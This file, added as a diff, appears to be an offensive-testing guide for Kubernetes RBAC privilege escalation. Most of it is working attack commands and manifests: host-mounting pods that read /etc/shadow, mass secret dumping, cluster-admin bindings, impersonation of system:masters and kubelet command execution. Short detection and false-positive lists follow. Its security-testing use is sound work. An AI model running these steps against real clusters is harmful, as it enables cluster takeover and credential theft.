@@ -1,0 +1,335 @@
+<vulnerability_guide>
+  <title>KUBERNETES RBAC ABUSE AND PRIVILEGE ESCALATION</title>
+
+  <critical>Kubernetes RBAC misconfigurations are the leading cause of cluster compromise. Overly permissive roles, dangerous verb/resource combinations, and service account abuse allow attackers to escalate from a single pod to cluster-admin. Many default configurations and common patterns inadvertently grant excessive privileges.</critical>
+
+  <scope>
+    - Service account privilege escalation
+    - Role and ClusterRole misconfigurations
+    - Dangerous permission combinations
+    - Namespace escape via RBAC
+    - Token theft and impersonation
+    - Secret access for credential extraction
+    - Node-level access escalation
+  </scope>
+
+  <methodology>
+    1. **Enumerate permissions**: List available verbs on all resources
+    2. **Identify escalation paths**: Find roles that grant privilege escalation
+    3. **Check service accounts**: Analyze SA permissions in accessible namespaces
+    4. **Test dangerous combinations**: Try known-dangerous permission pairs
+    5. **Extract credentials**: Access secrets and tokens
+    6. **Escalate**: Move from limited to cluster-admin access
+  </methodology>
+
+  <advanced_techniques>
+    <permission_enumeration>
+      Discover available permissions:
+      {% raw %}
+      # Check current permissions
+      kubectl auth can-i --list
+      kubectl auth can-i --list --namespace=kube-system
+
+      # Check specific permissions
+      kubectl auth can-i create pods
+      kubectl auth can-i get secrets
+      kubectl auth can-i '*' '*'
+
+      # Using SA token directly
+      KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+      curl -k -H "Authorization: Bearer $KUBE_TOKEN" \
+        https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+        -X POST -H "Content-Type: application/json" \
+        -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
+
+      # List roles and bindings
+      kubectl get roles,rolebindings -A
+      kubectl get clusterroles,clusterrolebindings
+
+      # Describe specific role
+      kubectl describe clusterrole admin
+      {% endraw %}
+    </permission_enumeration>
+
+    <dangerous_permissions>
+      Identify high-risk permission combinations:
+      {% raw %}
+      # CRITICAL: Direct cluster-admin equivalent
+      - create pods
+      - create deployments/daemonsets
+      - update/patch nodes
+      - create clusterrolebindings
+      - impersonate users/groups/serviceaccounts
+
+      # HIGH: Lead to escalation
+      - get secrets (access tokens, credentials)
+      - create/update roles (grant new permissions)
+      - update pods/exec (exec into any pod)
+      - create serviceaccounts
+      - create pods/attach, pods/portforward
+
+      # DANGEROUS COMBINATIONS:
+      # Can create pod + mount any secret = get all secrets
+      # Can create rolebinding + any role = privilege escalation
+      # Can update deployment + any namespace = code injection
+      # Can get nodes/proxy = kubelet API access
+
+      # Check for wildcard permissions
+      kubectl get clusterrole admin -o yaml | grep -E "\*|''"
+      {% endraw %}
+    </dangerous_permissions>
+
+    <pod_creation_escalation>
+      Escalate via pod creation:
+      {% raw %}
+      # Mount host filesystem
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: pwned
+      spec:
+        containers:
+        - name: pwned
+          image: alpine
+          command: ["/bin/sh", "-c", "cat /host/etc/shadow"]
+          volumeMounts:
+          - name: host
+            mountPath: /host
+        volumes:
+        - name: host
+          hostPath:
+            path: /
+            type: Directory
+
+      # Use privileged service account
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: pwned
+      spec:
+        serviceAccountName: cluster-admin
+        automountServiceAccountToken: true
+        containers:
+        - name: pwned
+          image: alpine
+
+      # Run on control plane node
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: pwned
+      spec:
+        nodeName: control-plane-node
+        tolerations:
+        - operator: "Exists"
+        hostNetwork: true
+        hostPID: true
+        containers:
+        - name: pwned
+          image: alpine
+          securityContext:
+            privileged: true
+      {% endraw %}
+    </pod_creation_escalation>
+
+    <secret_extraction>
+      Extract credentials from secrets:
+      {% raw %}
+      # List all secrets
+      kubectl get secrets -A
+
+      # Get specific secret
+      kubectl get secret admin-token -o yaml
+      kubectl get secret admin-token -o jsonpath='{.data.token}' | base64 -d
+
+      # Get all service account tokens
+      kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .metadata.name'
+
+      # Extract docker registry credentials
+      kubectl get secret regcred -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
+
+      # Get TLS certificates and keys
+      kubectl get secret tls-secret -o jsonpath='{.data.tls\.key}' | base64 -d
+
+      # AWS/GCP/Azure credentials in secrets
+      kubectl get secrets -A -o json | jq -r '.items[].data | keys[]' | grep -iE "aws|gcp|azure|key|token|password"
+      {% endraw %}
+    </secret_extraction>
+
+    <rolebinding_escalation>
+      Escalate via role binding creation:
+      {% raw %}
+      # Create binding to existing powerful role
+      kubectl create rolebinding pwned --clusterrole=admin --serviceaccount=default:default
+
+      # Create cluster-wide binding
+      kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default
+
+      # Bind to user/group
+      kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --user=attacker@example.com
+
+      # YAML for custom escalation
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRoleBinding
+      metadata:
+        name: escalation
+      subjects:
+      - kind: ServiceAccount
+        name: default
+        namespace: default
+      roleRef:
+        kind: ClusterRole
+        name: cluster-admin
+        apiGroup: rbac.authorization.k8s.io
+
+      # Check if you can create bindings
+      kubectl auth can-i create rolebindings
+      kubectl auth can-i create clusterrolebindings
+      {% endraw %}
+    </rolebinding_escalation>
+
+    <impersonation_attack>
+      Abuse user/group impersonation:
+      {% raw %}
+      # Check impersonation permissions
+      kubectl auth can-i impersonate users
+      kubectl auth can-i impersonate serviceaccounts
+      kubectl auth can-i impersonate groups
+
+      # Impersonate cluster-admin user
+      kubectl get pods --as=system:admin
+      kubectl get secrets --as=cluster-admin
+
+      # Impersonate service account
+      kubectl get pods --as=system:serviceaccount:kube-system:default
+
+      # Impersonate group
+      kubectl get pods --as-group=system:masters
+
+      # API call with impersonation
+      curl -k -H "Authorization: Bearer $TOKEN" \
+        -H "Impersonate-User: cluster-admin" \
+        https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
+      {% endraw %}
+    </impersonation_attack>
+
+    <node_access_escalation>
+      Escalate via node access:
+      {% raw %}
+      # If you can proxy to nodes
+      kubectl proxy &
+      curl http://localhost:8001/api/v1/nodes/node-name/proxy/pods
+
+      # Direct kubelet API access
+      curl -k https://node-ip:10250/pods
+      curl -k https://node-ip:10250/run/namespace/pod/container -d "cmd=id"
+
+      # Access node resources
+      kubectl debug node/node-name -it --image=alpine
+
+      # Exec to pod on target node, then escape
+      kubectl exec -it pod-on-target-node -- /bin/sh
+      # Then use container escape techniques
+
+      # If can update node labels
+      kubectl label node node-name kubernetes.io/role=master
+      # May allow scheduling on control plane
+      {% endraw %}
+    </node_access_escalation>
+
+    <namespace_escape>
+      Escape namespace restrictions:
+      {% raw %}
+      # If you have permissions in one namespace but need another
+
+      # Check cross-namespace access
+      kubectl auth can-i get pods -n kube-system
+
+      # Create pod that mounts secrets from other namespaces
+      # Requires appropriate SA permissions
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: cross-ns
+      spec:
+        containers:
+        - name: pwned
+          image: alpine
+          volumeMounts:
+          - name: secret
+            mountPath: /secret
+        volumes:
+        - name: secret
+          projected:
+            sources:
+            - serviceAccountToken:
+                path: token
+                expirationSeconds: 3600
+                audience: kube-system
+
+      # If you can create resources in kube-system
+      kubectl create deployment pwned -n kube-system --image=alpine
+      {% endraw %}
+    </namespace_escape>
+
+    <common_misconfigurations>
+      Exploit common RBAC mistakes:
+      {% raw %}
+      # Default service account with excessive permissions
+      kubectl get rolebindings,clusterrolebindings -A -o json | \
+        jq '.items[] | select(.subjects[]?.name=="default")'
+
+      # system:authenticated group with broad access
+      kubectl get clusterrolebindings -o json | \
+        jq '.items[] | select(.subjects[]?.name=="system:authenticated")'
+
+      # Wildcard permissions in roles
+      kubectl get clusterroles -o json | \
+        jq '.items[] | select(.rules[].verbs[] | contains("*"))'
+
+      # Roles allowing self-escalation
+      kubectl get clusterroles -o json | \
+        jq '.items[] | select(.rules[].resources[] | contains("clusterrolebindings"))'
+
+      # Overly permissive admission controllers (or lack thereof)
+      kubectl get pods -n kube-system | grep admission
+      {% endraw %}
+    </common_misconfigurations>
+  </advanced_techniques>
+
+  <validation>
+    - Escalate from limited service account to cluster-admin
+    - Extract secrets containing credentials or tokens
+    - Create privileged pod with host access
+    - Demonstrate cross-namespace access via RBAC abuse
+    - Document escalation path from initial foothold
+  </validation>
+
+  <false_positives>
+    - Legitimate admin service accounts
+    - CI/CD accounts with intentionally broad permissions
+    - Monitoring/observability tools requiring cluster-wide read access
+    - Operators and controllers with their required permissions
+  </false_positives>
+
+  <detection_indicators>
+    - Creation of new ClusterRoleBindings
+    - Access to secrets in kube-system or other sensitive namespaces
+    - Impersonation header usage
+    - Pod creation with hostPath mounts or privileged security context
+    - Self-subject access reviews (permission enumeration)
+  </detection_indicators>
+
+  <pro_tips>
+    - Always check what default service accounts can do
+    - system:authenticated often has more permissions than expected
+    - Pod creation permission is effectively cluster-admin
+    - Look for service accounts with excessive permissions across namespaces
+    - Many operators create overly permissive roles
+    - Check if PSP/PSA is enforced - affects pod-based escalation
+    - Aggregated ClusterRoles (admin, edit, view) may have unexpected permissions
+    - Token projection can be used for cross-namespace access
+  </pro_tips>
+
+  <remember>In Kubernetes, the ability to create pods, modify roles, or access secrets often leads directly to cluster compromise. RBAC misconfigurations compound - a single overly-permissive role can undermine the entire security model.</remember>
+</vulnerability_guide>
